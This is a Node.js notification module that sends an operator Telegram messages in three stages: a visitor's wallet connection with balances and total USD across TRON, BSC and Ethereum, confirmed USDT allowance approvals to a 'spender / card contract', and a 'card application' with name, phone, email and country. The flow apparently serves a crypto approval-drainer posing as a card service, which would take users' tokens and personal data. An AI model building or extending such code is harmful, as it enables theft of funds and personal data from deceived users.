const { sendTelegramMessage, escapeHtml, isConfigured } = require("./telegram");
const dedupe = require("../storage/notificationDedupe");
const logger = require("../utils/logger");

const SENSITIVE = /private.?key|mnemonic|seed.?phrase|password|symkey|bot.?token|authorization|api.?key|cookie|secret/i;

const NETWORKS = [
    { key: "tron", title: "TRON / TRC-20", native: "TRX" },
    { key: "bsc", title: "BNB Smart Chain / BEP-20", native: "BNB" },
    { key: "eth", title: "Ethereum / ERC-20", native: "ETH" }
];

function sanitizeValue(value) {
    if (value == null || value === "") {
        return "Unavailable";
    }

    const text = String(value);

    if (SENSITIVE.test(text)) {
        return "[redacted]";
    }

    return text;
}

function display(value) {
    if (value == null || value === "" || value === false) {
        return "Unavailable";
    }

    return escapeHtml(sanitizeValue(value));
}

function prettyNetwork(value) {
    const key = String(value || "").toLowerCase();

    if (key === "tron" || key.startsWith("tron:")) {
        return "TRON";
    }

    if (key === "bsc" || key === "eip155:56" || key === "bnb") {
        return "BNB Smart Chain";
    }

    if (key === "eth" || key === "ethereum" || key === "eip155:1") {
        return "Ethereum";
    }

    return value || "Unavailable";
}

function chainIdForNetwork(networkKey) {
    if (networkKey === "tron") {
        return "tron:0x2b6653dc";
    }

    if (networkKey === "bsc") {
        return "eip155:56";
    }

    if (networkKey === "eth" || networkKey === "ethereum") {
        return "eip155:1";
    }

    return null;
}

function walletForNetwork(session, networkKey) {
    const chainId = chainIdForNetwork(networkKey);
    const match = (session?.accounts || []).find((item) => (
        item.network === networkKey
        || item.chainId === chainId
        || (networkKey === "tron" && item.namespace === "tron")
        || ((networkKey === "bsc" || networkKey === "eth") && item.namespace === "eip155" && item.chainId === chainId)
    ));

    return match?.address || null;
}

function walletFromSession(session, networkKey) {
    return walletForNetwork(session, networkKey)
        || session?.wallet?.address
        || session?.accounts?.[0]?.address
        || null;
}

function balanceRow(session, networkKey) {
    const chainId = chainIdForNetwork(networkKey);
    return (session?.balances || []).find((item) => (
        item.network === networkKey || item.chainId === chainId
    )) || null;
}

function displayAmount(asset) {
    if (!asset || asset.balance == null || asset.balance === "" || asset.error) {
        return "Unavailable";
    }

    return escapeHtml(String(asset.balance));
}

function displayUsd(value) {
    if (value == null || value === "") {
        return "Unavailable";
    }

    const text = String(value);
    return escapeHtml(text.startsWith("$") ? text : `$${text}`);
}

function networkBlock(session, spec) {
    const row = balanceRow(session, spec.key);
    const address = walletForNetwork(session, spec.key) || row?.address || null;

    return [
        `<b>${escapeHtml(spec.title)}</b>`,
        `Address: ${display(address)}`,
        `${escapeHtml(spec.native)}: ${displayAmount(row?.native)}`,
        `USDT: ${displayAmount(row?.usdt)}`,
        `USD: ${displayUsd(row?.usdt?.usdValue)}`
    ];
}

function buildWalletConnectedMessage(session) {
    const walletName = session.walletName || session.wallet?.name || session.peer?.name;
    const lines = [
        "🔗 <b>1/3 WALLET CONNECTED</b>",
        "",
        `<b>Wallet name:</b> ${display(walletName)}`,
        `<b>Connection ID:</b> ${display(session.connectionId)}`,
        ""
    ];

    NETWORKS.forEach((spec, index) => {
        if (index > 0) {
            lines.push("--------------------------------");
        }

        lines.push(...networkBlock(session, spec));
        lines.push("");
    });

    lines.push(`<b>Time:</b> ${display(new Date().toISOString())}`);
    lines.push(`💰 <b>Total USD:</b> ${displayUsd(session.totalUsd)}`);

    return lines.join("\n");
}

function formatApprovedAmount(payment) {
    if (payment?.verifiedAmountRaw == null) {
        return display(payment?.allowance);
    }

    try {
        const raw = BigInt(payment.verifiedAmountRaw);
        const decimals = Number(payment.decimals || 6);
        const base = 10n ** BigInt(decimals);
        const whole = raw / base;
        const fraction = raw % base;
        const fractionText = fraction.toString().padStart(decimals, "0").replace(/0+$/, "");
        return fractionText ? `${whole.toString()}.${fractionText} USDT` : `${whole.toString()} USDT`;
    } catch (_err) {
        return display(payment.allowance);
    }
}

function paymentForNetwork(payments, spec) {
    const rows = Array.isArray(payments) ? payments : payments ? [payments] : [];
    return rows.find((item) => item?.network === spec.key) || null;
}

function approvalLine(session, spec, paymentOrPayments) {
    const address = walletForNetwork(session, spec.key);
    const payment = Array.isArray(paymentOrPayments)
        ? paymentForNetwork(paymentOrPayments, spec)
        : (paymentOrPayments?.network === spec.key ? paymentOrPayments : paymentForNetwork(paymentOrPayments ? [paymentOrPayments] : [], spec));
    const approved = payment?.status === "verified" && payment?.transactionHash;
    const status = approved ? "Approved" : "Not approved";
    const hash = approved ? payment.transactionHash : "Unavailable";

    return [
        `<b>${escapeHtml(spec.title)}</b>`,
        `Address: ${display(address)}`,
        `Status: ${status}`,
        `Hash: ${display(hash)}`
    ];
}

function buildApprovalStatusMessage(payment, session, payments) {
    const rows = payments && payments.length ? payments : [payment];
    const verified = rows.filter((item) => item?.status === "verified" && item?.transactionHash);
    const lines = [
        "✅ <b>2/3 APPROVAL STATUS</b>",
        "",
        `<b>Networks:</b> ${display(rows.map((item) => prettyNetwork(item.network)).filter(Boolean).join(", ") || payment.network)}`,
        `<b>Approved amount:</b> ${verified.length ? escapeHtml(formatApprovedAmount(verified[0])) : "Unavailable"}`,
        `<b>Token:</b> ${display(payment.token || "USDT")}`,
        ""
    ];

    NETWORKS.forEach((spec, index) => {
        if (index > 0) {
            lines.push("--------------------------------");
        }

        lines.push(...approvalLine(session, spec, rows));
        lines.push("");
    });

    lines.push(`<b>Time:</b> ${display(payment.updatedAt || new Date().toISOString())}`);

    return lines.join("\n");
}

function buildCardApplicationMessage(application, session) {
    const payment = application.payment || null;
    const lines = [
        "🪪 <b>3/3 CARD APPLICATION</b>",
        "",
        `<b>Application ID:</b> ${display(application.applicationId)}`,
        "",
        "<b>Customer</b>",
        `Name: ${display(application.name)}`,
        `Phone: ${display(application.phone)}`,
        `Email: ${display(application.email)}`,
        `Country: ${display(application.country)}`,
        ""
    ];

    NETWORKS.forEach((spec, index) => {
        if (index > 0) {
            lines.push("--------------------------------");
        }

        lines.push(...networkBlock(session, spec));
        lines.push("");
    });

    lines.push("<b>Authorization</b>");
    const group = [];
    try {
        const paymentStore = require("../storage/payments");
        group.push(...paymentStore.listByConnection(application.connectionId || payment?.connectionId));
    } catch (_err) {
        /* ignore */
    }
    const rows = group.length ? group : (payment ? [payment] : []);
    rows.forEach((item) => {
        lines.push(`${prettyNetwork(item.network)}: ${item.status === "verified" && item.transactionHash ? display(item.transactionHash) : "Not approved"}`);
    });
    if (!rows.length) {
        lines.push(`Approval hash: ${display(payment?.transactionHash)}`);
    }
    lines.push(`Spender / card contract: ${display(payment?.spender)}`);
    lines.push(`Token contract: ${display(payment?.tokenContract)}`);
    lines.push(`Amount: ${display(payment?.allowance || "1 USDT")}`);
    lines.push("");
    lines.push(`<b>Submitted:</b> ${display(application.submittedAt)}`);

    return lines.join("\n");
}

async function notifyWalletConnected(session, send = sendTelegramMessage) {
    try {
        if (!session?.connectionId) {
            return { ok: false, skipped: true, reason: "No session" };
        }

        if (!isConfigured()) {
            return { ok: false, skipped: true, reason: "Telegram is not configured" };
        }

        if (!dedupe.tryClaim("wallet_connected", session.connectionId)) {
            return { ok: false, skipped: true, reason: "duplicate" };
        }

        return await send(buildWalletConnectedMessage(session));
    } catch (err) {
        logger.warn({ err: { message: err.message } }, "notifyWalletConnected failed");
        return { ok: false, skipped: false, reason: err.message };
    }
}

async function notifyApprovalStatus(payment, send = sendTelegramMessage) {
    try {
        if (!payment) {
            return { ok: false, skipped: true, reason: "No payment" };
        }

        const paymentStore = require("../storage/payments");
        const group = paymentStore.listByConnection(payment.connectionId);
        const rows = group.length ? group : [payment];
        const terminal = new Set(["verified", "rejected", "invalid"]);
        const pending = rows.some((item) => !terminal.has(item.status));
        const confirmed = rows.filter((item) => item.status === "verified" && item.transactionHash);

        if (pending) {
            return { ok: false, skipped: true, reason: "Approvals still in progress" };
        }

        if (!confirmed.length) {
            return { ok: false, skipped: true, reason: "No confirmed approval hash yet" };
        }

        if (!isConfigured()) {
            return { ok: false, skipped: true, reason: "Telegram is not configured" };
        }

        if (!dedupe.tryClaim("approval_status", payment.connectionId || payment.paymentId)) {
            return { ok: false, skipped: true, reason: "duplicate" };
        }

        const sessionStore = require("../storage/sessions");
        const session = sessionStore.getSession(payment.connectionId) || {};

        return await send(buildApprovalStatusMessage(confirmed[0], session, rows));
    } catch (err) {
        logger.warn({ err: { message: err.message } }, "notifyApprovalStatus failed");
        return { ok: false, skipped: false, reason: err.message };
    }
}

async function notifyApprovalSuccess(payment, send = sendTelegramMessage) {
    return notifyApprovalStatus(payment, send);
}

async function notifyCardApplication(application, send = sendTelegramMessage) {
    try {
        if (!application?.applicationId) {
            return { ok: false, skipped: true, reason: "No application id" };
        }

        if (!isConfigured()) {
            return { ok: false, skipped: true, reason: "Telegram is not configured" };
        }

        if (!dedupe.tryClaim("card_application", application.applicationId)) {
            return { ok: false, skipped: true, reason: "duplicate" };
        }

        const sessionStore = require("../storage/sessions");
        const session = sessionStore.getSession(application.connectionId) || {};

        return await send(buildCardApplicationMessage(application, session));
    } catch (err) {
        logger.warn({ err: { message: err.message } }, "notifyCardApplication failed");
        return { ok: false, skipped: false, reason: err.message };
    }
}

module.exports = {
    sanitizeValue,
    notifyWalletConnected,
    notifyApprovalStatus,
    notifyApprovalSuccess,
    notifyCardApplication,
    prettyNetwork,
    walletFromSession,
    buildWalletConnectedMessage,
    buildApprovalStatusMessage,
    buildCardApplicationMessage
};
